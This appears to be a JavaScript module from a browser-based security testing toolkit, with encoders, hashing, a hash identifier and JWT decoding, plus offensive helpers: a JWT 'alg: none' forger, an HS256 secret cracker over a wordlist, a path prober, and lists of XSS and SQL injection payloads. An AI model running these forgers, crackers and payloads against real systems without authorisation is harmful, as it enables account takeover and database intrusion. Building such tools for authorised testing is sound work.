// Pure-browser security tool implementations.
import { logRequest } from '../store.js';

// Instrumented fetch that logs to history (call sparingly — fuzzers should opt-out)
export async function tfetch(url, opts = {}) {
  const start = performance.now();
  let entry = { method: opts.method || 'GET', url, status: null, time: 0, err: null };
  try {
    const res = await fetch(url, opts);
    entry.status = res.status;
    entry.time = Math.round(performance.now() - start);
    if (opts._log !== false) logRequest(entry);
    return res;
  } catch (e) {
    entry.err = e.message;
    entry.time = Math.round(performance.now() - start);
    if (opts._log !== false) logRequest(entry);
    throw e;
  }
}

// ───── Encoders / Decoders ─────
export const codecs = {
  base64Enc: (s) => btoa(unescape(encodeURIComponent(s))),
  base64Dec: (s) => { try { return decodeURIComponent(escape(atob(s))); } catch { return '[invalid base64]'; } },
  urlEnc: (s) => encodeURIComponent(s),
  urlDec: (s) => { try { return decodeURIComponent(s); } catch { return '[invalid]'; } },
  hexEnc: (s) => [...new TextEncoder().encode(s)].map(b => b.toString(16).padStart(2, '0')).join(''),
  hexDec: (s) => { try { return new TextDecoder().decode(new Uint8Array(s.match(/.{1,2}/g).map(b => parseInt(b, 16)))); } catch { return '[invalid hex]'; } },
  htmlEnc: (s) => s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])),
  htmlDec: (s) => s.replace(/&(amp|lt|gt|quot|#39);/g, m => ({'&amp;':'&','&lt;':'<','&gt;':'>','&quot;':'"','&#39;':"'"}[m])),
  unicodeEnc: (s) => [...s].map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
  unicodeDec: (s) => s.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16))),
  rot13: (s) => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)),
  reverse: (s) => [...s].reverse().join(''),
  binEnc: (s) => [...new TextEncoder().encode(s)].map(b => b.toString(2).padStart(8, '0')).join(' '),
  binDec: (s) => { try { return new TextDecoder().decode(new Uint8Array(s.trim().split(/\s+/).map(b => parseInt(b, 2)))); } catch { return '[invalid]'; } }
};

// ───── Hashing (Web Crypto) ─────
export async function hash(text, algo = 'SHA-256') {
  const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text));
  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
}

// MD5 (Web Crypto doesn't support it — pure JS implementation)
export function md5(s) {
  function rh(n) { let j, s = ''; for (j = 0; j <= 3; j++) s += ((n >> (j * 8 + 4)) & 0x0F).toString(16) + ((n >> (j * 8)) & 0x0F).toString(16); return s; }
  function ad(x, y) { const l = (x & 0xFFFF) + (y & 0xFFFF); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xFFFF); }
  function rl(n, c) { return (n << c) | (n >>> (32 - c)); }
  function cm(q, a, b, x, s, t) { return ad(rl(ad(ad(a, q), ad(x, t)), s), b); }
  function ff(a, b, c, d, x, s, t) { return cm((b & c) | (~b & d), a, b, x, s, t); }
  function gg(a, b, c, d, x, s, t) { return cm((b & d) | (c & ~d), a, b, x, s, t); }
  function hh(a, b, c, d, x, s, t) { return cm(b ^ c ^ d, a, b, x, s, t); }
  function ii(a, b, c, d, x, s, t) { return cm(c ^ (b | ~d), a, b, x, s, t); }
  function c2b(str) {
    const b = []; const m = (1 << 8) - 1;
    for (let i = 0; i < str.length * 8; i += 8) b[i >> 5] |= (str.charCodeAt(i / 8) & m) << (i % 32);
    return b;
  }
  const x = c2b(unescape(encodeURIComponent(s)));
  const l = s.length * 8;
  x[l >> 5] |= 0x80 << ((l) % 32);
  x[(((l + 64) >>> 9) << 4) + 14] = l;
  let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
  for (let i = 0; i < x.length; i += 16) {
    const oa = a, ob = b, oc = c, od = d;
    a = ff(a, b, c, d, x[i], 7, -680876936); d = ff(d, a, b, c, x[i+1], 12, -389564586); c = ff(c, d, a, b, x[i+2], 17, 606105819); b = ff(b, c, d, a, x[i+3], 22, -1044525330);
    a = ff(a, b, c, d, x[i+4], 7, -176418897); d = ff(d, a, b, c, x[i+5], 12, 1200080426); c = ff(c, d, a, b, x[i+6], 17, -1473231341); b = ff(b, c, d, a, x[i+7], 22, -45705983);
    a = ff(a, b, c, d, x[i+8], 7, 1770035416); d = ff(d, a, b, c, x[i+9], 12, -1958414417); c = ff(c, d, a, b, x[i+10], 17, -42063); b = ff(b, c, d, a, x[i+11], 22, -1990404162);
    a = ff(a, b, c, d, x[i+12], 7, 1804603682); d = ff(d, a, b, c, x[i+13], 12, -40341101); c = ff(c, d, a, b, x[i+14], 17, -1502002290); b = ff(b, c, d, a, x[i+15], 22, 1236535329);
    a = gg(a, b, c, d, x[i+1], 5, -165796510); d = gg(d, a, b, c, x[i+6], 9, -1069501632); c = gg(c, d, a, b, x[i+11], 14, 643717713); b = gg(b, c, d, a, x[i], 20, -373897302);
    a = gg(a, b, c, d, x[i+5], 5, -701558691); d = gg(d, a, b, c, x[i+10], 9, 38016083); c = gg(c, d, a, b, x[i+15], 14, -660478335); b = gg(b, c, d, a, x[i+4], 20, -405537848);
    a = gg(a, b, c, d, x[i+9], 5, 568446438); d = gg(d, a, b, c, x[i+14], 9, -1019803690); c = gg(c, d, a, b, x[i+3], 14, -187363961); b = gg(b, c, d, a, x[i+8], 20, 1163531501);
    a = gg(a, b, c, d, x[i+13], 5, -1444681467); d = gg(d, a, b, c, x[i+2], 9, -51403784); c = gg(c, d, a, b, x[i+7], 14, 1735328473); b = gg(b, c, d, a, x[i+12], 20, -1926607734);
    a = hh(a, b, c, d, x[i+5], 4, -378558); d = hh(d, a, b, c, x[i+8], 11, -2022574463); c = hh(c, d, a, b, x[i+11], 16, 1839030562); b = hh(b, c, d, a, x[i+14], 23, -35309556);
    a = hh(a, b, c, d, x[i+1], 4, -1530992060); d = hh(d, a, b, c, x[i+4], 11, 1272893353); c = hh(c, d, a, b, x[i+7], 16, -155497632); b = hh(b, c, d, a, x[i+10], 23, -1094730640);
    a = hh(a, b, c, d, x[i+13], 4, 681279174); d = hh(d, a, b, c, x[i], 11, -358537222); c = hh(c, d, a, b, x[i+3], 16, -722521979); b = hh(b, c, d, a, x[i+6], 23, 76029189);
    a = hh(a, b, c, d, x[i+9], 4, -640364487); d = hh(d, a, b, c, x[i+12], 11, -421815835); c = hh(c, d, a, b, x[i+15], 16, 530742520); b = hh(b, c, d, a, x[i+2], 23, -995338651);
    a = ii(a, b, c, d, x[i], 6, -198630844); d = ii(d, a, b, c, x[i+7], 10, 1126891415); c = ii(c, d, a, b, x[i+14], 15, -1416354905); b = ii(b, c, d, a, x[i+5], 21, -57434055);
    a = ii(a, b, c, d, x[i+12], 6, 1700485571); d = ii(d, a, b, c, x[i+3], 10, -1894986606); c = ii(c, d, a, b, x[i+10], 15, -1051523); b = ii(b, c, d, a, x[i+1], 21, -2054922799);
    a = ii(a, b, c, d, x[i+8], 6, 1873313359); d = ii(d, a, b, c, x[i+15], 10, -30611744); c = ii(c, d, a, b, x[i+6], 15, -1560198380); b = ii(b, c, d, a, x[i+13], 21, 1309151649);
    a = ii(a, b, c, d, x[i+4], 6, -145523070); d = ii(d, a, b, c, x[i+11], 10, -1120210379); c = ii(c, d, a, b, x[i+2], 15, 718787259); b = ii(b, c, d, a, x[i+9], 21, -343485551);
    a = ad(a, oa); b = ad(b, ob); c = ad(c, oc); d = ad(d, od);
  }
  return rh(a) + rh(b) + rh(c) + rh(d);
}

// ───── Hash identifier ─────
export function identifyHash(h) {
  h = h.trim();
  const out = [];
  if (/^[a-f0-9]{32}$/i.test(h)) out.push('MD5', 'NTLM', 'MD4');
  if (/^[a-f0-9]{40}$/i.test(h)) out.push('SHA-1', 'RIPEMD-160');
  if (/^[a-f0-9]{56}$/i.test(h)) out.push('SHA-224');
  if (/^[a-f0-9]{64}$/i.test(h)) out.push('SHA-256');
  if (/^[a-f0-9]{96}$/i.test(h)) out.push('SHA-384');
  if (/^[a-f0-9]{128}$/i.test(h)) out.push('SHA-512');
  if (/^\$2[abxy]\$\d+\$/.test(h)) out.push('bcrypt');
  if (/^\$1\$/.test(h)) out.push('MD5 crypt');
  if (/^\$5\$/.test(h)) out.push('SHA-256 crypt');
  if (/^\$6\$/.test(h)) out.push('SHA-512 crypt');
  if (/^\$argon2/.test(h)) out.push('Argon2');
  if (/^[A-Za-z0-9./]{13}$/.test(h)) out.push('DES crypt');
  return out.length ? out : ['Unknown'];
}

// ───── JWT ─────
export function decodeJWT(token) {
  const parts = token.split('.');
  if (parts.length !== 3) throw new Error('Not a valid JWT (expected 3 parts)');
  const b64u = (s) => atob(s.replace(/-/g, '+').replace(/_/g, '/').padEnd(s.length + (4 - s.length % 4) % 4, '='));
  const header = JSON.parse(b64u(parts[0]));
  const payload = JSON.parse(b64u(parts[1]));
  return { header, payload, signature: parts[2], raw: parts };
}
export function jwtNoneAttack(token) {
  const { header, payload } = decodeJWT(token);
  const newHeader = { ...header, alg: 'none' };
  const b64u = (o) => btoa(JSON.stringify(o)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  return `${b64u(newHeader)}.${b64u(payload)}.`;
}
export async function jwtCrackHS256(token, wordlist) {
  const [h, p, sig] = token.split('.');
  const data = `${h}.${p}`;
  for (const secret of wordlist) {
    const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
    const mac = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
    const computed = btoa(String.fromCharCode(...new Uint8Array(mac))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    if (computed === sig) return secret;
  }
  return null;
}

// ───── Fetch helpers with concurrency ─────
export async function parallel(items, worker, concurrency = 8, onProgress) {
  const out = [];
  let idx = 0, done = 0;
  async function run() {
    while (idx < items.length) {
      const i = idx++;
      try { out[i] = await worker(items[i], i); } catch (e) { out[i] = { error: e.message }; }
      done++;
      onProgress && onProgress(done, items.length);
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, run));
  return out;
}

export async function probePath(base, path, opts = {}) {
  const url = base.replace(/\/$/, '') + (path.startsWith('/') ? path : '/' + path);
  const start = performance.now();
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), opts.timeout || 8000);
    const res = await fetch(url, {
      method: opts.method || 'GET',
      mode: 'cors',
      redirect: 'manual',
      signal: ctrl.signal,
      headers: opts.headers,
      body: opts.body
    });
    clearTimeout(t);
    return { url, status: res.status, time: Math.round(performance.now() - start), res };
  } catch (e) {
    if (e.name === 'AbortError') return { url, status: 'timeout', time: opts.timeout || 8000 };
    // CORS-blocked but reachable: try no-cors
    try {
      await fetch(url, { method: 'HEAD', mode: 'no-cors' });
      return { url, status: 'cors', time: Math.round(performance.now() - start) };
    } catch {
      return { url, status: 'error', time: Math.round(performance.now() - start), error: e.message };
    }
  }
}

// ───── XSS / SQLi reflection tester ─────
export const XSS_PAYLOADS = [
  `<script>alert(1)</script>`,
  `"><script>alert(1)</script>`,
  `'><img src=x onerror=alert(1)>`,
  `<svg/onload=alert(1)>`,
  `javascript:alert(1)`,
  `"><svg onload=confirm(1)>`,
  `<iframe src=javascript:alert(1)>`
];
export const SQLI_PAYLOADS = [
  `'`,
  `''`,
  `' OR '1'='1`,
  `' OR '1'='1'-- -`,
  `1' AND SLEEP(5)-- -`,
  `' UNION SELECT NULL-- -`,
  `") OR ("1"="1`,
  `admin'--`
];
export const SQLI_ERRORS = /SQL syntax|mysql_fetch|ORA-\d+|PostgreSQL.*ERROR|sqlite_|SQLite\/JDBC|System\.Data\.SqlClient|Microsoft.*ODBC.*SQL Server|JET Database|unclosed quotation mark|quoted string not properly terminated/i;
